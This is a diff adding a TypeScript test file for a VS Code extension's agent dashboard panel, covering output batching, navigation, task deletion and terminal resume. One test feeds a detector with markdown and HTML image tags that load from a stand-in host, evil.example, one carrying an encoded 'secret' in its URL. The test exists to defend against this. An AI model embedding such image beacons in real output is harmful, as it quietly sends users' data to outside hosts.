@@ -1,0 +1,196 @@
+// What the dashboard panel posts of an agent's streamed output: in batches, and nothing half a sentence long.
+import test from 'node:test';
+import * as assert from 'node:assert/strict';
+import Module from 'module';
+import * as fs from 'fs';
+import * as os from 'os';
+import * as path from 'path';
+
+import type { HostMessage, TranscriptItem } from '../src/core/wire';
+
+// panel.ts loads `vscode`: the dialogs a test answers, nothing else.
+/* eslint-disable @typescript-eslint/no-require-imports */
+const vscodeStub = { window: {} as Record<string, unknown>, workspace: { onDidChangeConfiguration: () => ({ dispose() {} }) }, Uri: { file: (fsPath: string) => ({ fsPath }) }, ThemeIcon: class {} };
+const loader = Module as unknown as { _load: (request: string, ...rest: unknown[]) => unknown };
+const load = loader._load;
+loader._load = function (this: unknown, request: string, ...rest: unknown[]) {
+  return request === 'vscode' ? vscodeStub : load.call(this, request, ...rest);
+};
+const { DashboardPanel } = require('../src/panel') as typeof import('../src/panel');
+loader._load = load;
+
+/** A panel without a webview: what it posts, and whether it is in view. */
+function panel() {
+  const posted: HostMessage[] = [];
+  const view = { visible: true };
+  const p = Object.assign(Object.create(DashboardPanel.prototype) as InstanceType<typeof DashboardPanel>, {
+    panel: view,
+    booted: true,
+    outputQueue: [],
+    outputTimer: undefined,
+    missedText: new Set<string>(),
+    post: (m: HostMessage) => (posted.push(m), Promise.resolve(true)),
+  });
+  return { p, posted, view };
+}
+
+const delta = (key: string, text: string) => ({ type: 'output' as const, taskId: 'T', key, item: { type: 'text_delta' as const, text } });
+const flushed = () => new Promise((r) => setTimeout(r, 80));
+
+test('panel: streamed text goes in one message per batch, merged, in order with the rest', async () => {
+  const { p, posted } = panel();
+  for (const piece of ['Reading ', 'the ', 'plan']) p.queueOutput(delta('a', piece));
+  p.queueOutput({ type: 'output', taskId: 'T', key: 'a', item: { type: 'tool_use', id: '1', name: 'Read', input: {} } });
+  assert.equal(posted.length, 0, 'nothing goes before the batch is due');
+  await flushed();
+  assert.deepEqual(posted.map((m) => (m.type === 'output' ? [m.item.type, 'text' in m.item ? m.item.text : ''] : m.type)), [['text_delta', 'Reading the plan'], ['tool_use', '']]);
+});
+
+test('panel: a hidden panel gets no text pieces, and none of that message after it shows again until the whole text', async () => {
+  const { p, posted, view } = panel();
+  view.visible = false;
+  p.queueOutput(delta('a', 'Half a '));
+  view.visible = true;
+  p.queueOutput(delta('a', 'sentence'));
+  p.queueOutput(delta('b', 'Another step'));
+  p.queueOutput({ type: 'output', taskId: 'T', key: 'a', item: { type: 'text', text: 'Half a sentence.' } });
+  p.queueOutput(delta('a', 'Next '));
+  await flushed();
+  assert.deepEqual(posted.map((m) => (m.type === 'output' && 'text' in m.item ? [m.key, m.item.type, m.item.text] : null)), [['b', 'text_delta', 'Another step'], ['a', 'text', 'Half a sentence.'], ['a', 'text_delta', 'Next ']]);
+});
+
+test('panel: text missed while hidden holds back that step of that task only, until its message ends', async () => {
+  const { p, posted, view } = panel();
+  const of = (taskId: string, key: string, item: TranscriptItem) => ({ type: 'output' as const, taskId, key, item });
+  view.visible = false;
+  p.queueOutput(of('A', 'k', { type: 'text_delta', text: 'Half ' }));
+  view.visible = true;
+  p.queueOutput(of('A', 'k', { type: 'text_delta', text: 'a sentence' }));
+  p.queueOutput(of('B', 'k', { type: 'text_delta', text: 'Another task, the same key' }));
+  p.queueOutput(of('A', 'k', { type: 'turn_end', ok: false, costUsd: 0, turns: 1 }));
+  p.queueOutput(of('A', 'k', { type: 'text_delta', text: 'Next turn' }));
+  await flushed();
+  assert.deepEqual(posted.map((m) => (m.type === 'output' ? `${m.taskId}:${m.item.type}${'text' in m.item ? `:${m.item.text}` : ''}` : m.type)), ['B:text_delta:Another task, the same key', 'A:turn_end', 'A:text_delta:Next turn']);
+});
+
+test('panel: a folder without library.yaml becomes a library once you say so', async () => {
+  const ws = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'cs-lib-ws-')));
+  fs.mkdirSync(path.join(ws, '.claudestrator'));
+  fs.writeFileSync(path.join(ws, '.claudestrator', 'config.yaml'), 'language: English\n');
+  const lib = path.join(ws, 'agents-lib');
+  fs.mkdirSync(lib);
+  // The folder picked, "Start a library", then "This project".
+  vscodeStub.window.showOpenDialog = async () => [{ fsPath: lib }];
+  vscodeStub.window.showInformationMessage = async (_m: string, _o: unknown, ...items: string[]) => items[items.length - 1];
+  const p = Object.assign(Object.create(DashboardPanel.prototype) as InstanceType<typeof DashboardPanel>, { orch: { root: ws } });
+  const r = await p.$addLibrary();
+  assert.ok(r.added, JSON.stringify(r));
+  assert.ok(fs.existsSync(path.join(lib, 'library.yaml')), 'library.yaml is written');
+  assert.match(fs.readFileSync(path.join(ws, '.claudestrator', 'config.yaml'), 'utf8'), /libraries:\n\s+- \.\.\/agents-lib/);
+});
+
+test('panel: a report that would load images from the web is opened as text, not in the preview', async () => {
+  const { loadsRemote } = await import('../src/core/view');
+  for (const md of ['![x](https://evil.example/?q=c2VjcmV0)', '![](//evil.example/a.png)', '<img src="https://evil.example/p">', '<img alt=x src=http://evil.example/p>', '![logo][l]\n\n[l]: https://evil.example/l.png', '<video poster="https://evil.example/p">']) {
+    assert.equal(loadsRemote(md), true, md);
+  }
+  for (const md of ['# Plan\n\n[docs](https://docs.acme.com) and https://example.com', '![diagram](./diagram.png)', '[l]: https://example.com with no image']) {
+    assert.equal(loadsRemote(md), false, md);
+  }
+});
+
+test('panel: the page gets the streamed output of the task it shows, and of no other', async () => {
+  let engine: ((e: { name: string; data: unknown }) => void) | undefined;
+  const on = () => ({ dispose() {} });
+  const orch = { onEngine: (fn: typeof engine) => ((engine = fn), { dispose() {} }), onDidChange: on, onDidChangeConfig: on };
+  const { p, posted } = panel();
+  Object.assign(p, { orch, disposables: [], viewing: null });
+  p.listen();
+  const item = { type: 'tool_use', id: '1', name: 'Write', input: { file_path: 'a.ts', content: 'x'.repeat(1000) } };
+  engine!({ name: 'output', data: { taskId: 'A', key: 'k', item } });
+  await flushed();
+  assert.equal(posted.length, 0, 'the page shows no task');
+  await p.$view({ taskId: 'B' });
+  engine!({ name: 'output', data: { taskId: 'A', key: 'k', item } });
+  engine!({ name: 'output', data: { taskId: 'B', key: 'k', item } });
+  await flushed();
+  assert.deepEqual(posted.map((m) => (m as { taskId?: string }).taskId), ['B']);
+});
+
+test('panel: Continue in terminal runs Claude itself, so no shell reads a path with spaces', async () => {
+  const opened: Record<string, unknown>[] = [];
+  vscodeStub.window.createTerminal = (options: Record<string, unknown>) => (opened.push(options), { show() {} });
+  const { setShim } = await import('../src/core/git');
+  const viewModule = require('../src/core/view') as { detail: unknown };
+  const detail = viewModule.detail;
+  const session = '0b7e1d7c-3f0e-4a8e-9d2b-5c1f6a7e8d90';
+  viewModule.detail = async () => ({ steps: [{ key: 'k', agent: 'developer', repo: 'api', sessionId: session, configDir: 'C:\\Users\\me\\.claude-work' }] });
+  try {
+    for (const claude of ['C:\\Program Files\\Claude\\claude.exe', 'C:\\Users\\me\\AppData\\Roaming\\npm\\claude.cmd']) {
+      const p = Object.assign(Object.create(DashboardPanel.prototype) as InstanceType<typeof DashboardPanel>, { orch: { engine: {}, root: 'C:\\ws', claudeCommand: () => claude, accountChoice: () => ({ dir: null }) } });
+      await p.$resumeTerminal({ taskId: 'T-1', key: 'k' });
+    }
+    setShim('C:\\npm global\\claude.cmd', { file: 'C:\\Program Files\\nodejs\\node.exe', args: ['C:\\npm global\\node_modules\\@anthropic-ai\\claude-code\\cli.js'] });
+    const p = Object.assign(Object.create(DashboardPanel.prototype) as InstanceType<typeof DashboardPanel>, { orch: { engine: {}, root: 'C:\\ws', claudeCommand: () => 'C:\\npm global\\claude.cmd', accountChoice: () => ({ dir: null }) } });
+    await p.$resumeTerminal({ taskId: 'T-1', key: 'k' });
+  } finally {
+    viewModule.detail = detail;
+  }
+  assert.deepEqual(opened.map((o) => [o.shellPath, o.shellArgs]), [
+    ['C:\\Program Files\\Claude\\claude.exe', ['--resume', session]],
+    ['C:\\Users\\me\\AppData\\Roaming\\npm\\claude.cmd', ['--resume', session]],
+    ['C:\\Program Files\\nodejs\\node.exe', ['C:\\npm global\\node_modules\\@anthropic-ai\\claude-code\\cli.js', '--resume', session]],
+  ]);
+  assert.equal((opened[0]!.env as { CLAUDE_CONFIG_DIR?: string }).CLAUDE_CONFIG_DIR, 'C:\\Users\\me\\.claude-work', 'the account the step ran under');
+});
+
+test('panel: the sidebar deletes a task and opens config.yaml without a dashboard', async () => {
+  const { deleteTask, openConfig } = await import('../src/panel');
+  const done: string[] = [];
+  const engine = {
+    svc: { state: async () => ({ gitMode: 'worktree', repos: [{ name: 'api' }] }), runsElsewhere: async () => null },
+    isRunning: () => true,
+    stop: async () => void done.push('stop'),
+    settled: async () => void done.push('settled'),
+    cleanup: async () => (done.push('cleanup'), []),
+    remove: async () => void done.push('remove'),
+  } as unknown as Parameters<typeof deleteTask>[0];
+  vscodeStub.window.showWarningMessage = async () => undefined;
+  assert.deepEqual(await deleteTask(engine, 'T-1'), { deleted: false }, 'nothing without your yes');
+  assert.deepEqual(done, []);
+  vscodeStub.window.showWarningMessage = async () => 'Delete';
+  assert.deepEqual(await deleteTask(engine, 'T-1'), { deleted: true });
+  assert.deepEqual(done, ['stop', 'settled', 'cleanup', 'remove'], 'stopped and settled before its worktrees go');
+
+  const ws = fs.mkdtempSync(path.join(os.tmpdir(), 'cs-open-config-'));
+  const shown: string[] = [];
+  vscodeStub.window.showTextDocument = async (uri: { fsPath: string }) => void shown.push(uri.fsPath);
+  await openConfig(ws, 'project');
+  assert.deepEqual(shown, [path.join(ws, '.claudestrator', 'config.yaml')]);
+  assert.match(fs.readFileSync(shown[0]!, 'utf8'), /^# Claudestrator workspace config/);
+
+  // A dashboard that shows the deleted task leaves it; one that shows another stays.
+  const { p, posted } = panel();
+  Object.assign(p, { viewing: 'T-2' });
+  p.taskDeleted('T-1');
+  Object.assign(p, { viewing: 'T-1' });
+  p.taskDeleted('T-1');
+  assert.deepEqual(posted, [{ type: 'navigate', route: { name: 'home' } }]);
+});
+
+test('panel: a page still loading starts on the last screen asked for, not the first', async () => {
+  const { p, posted } = panel();
+  Object.assign(p, { booted: false, initialRoute: { name: 'task', taskId: 'A' }, context: { extension: { packageJSON: { version: '1.0.0' } } } });
+  p.navigate({ name: 'task', taskId: 'B' });
+  assert.deepEqual(posted, [], 'nothing goes to a page that does not listen yet');
+  assert.deepEqual((await p.$boot()).route, { name: 'task', taskId: 'B' });
+  p.navigate({ name: 'task', taskId: 'C' });
+  assert.deepEqual(posted, [{ type: 'navigate', route: { name: 'task', taskId: 'C' } }], 'a booted page is sent there');
+});
+
+test("panel: a deleted task's screen hears so, and goes home", async () => {
+  const { p } = panel();
+  const svc = { exists: async () => false };
+  Object.assign(p, { orch: { engine: { svc } }, viewing: 'T-1' });
+  await assert.rejects(() => p.$task({ taskId: 'T-1' }), (e: { code?: string }) => e.code === 'no_task');
+});
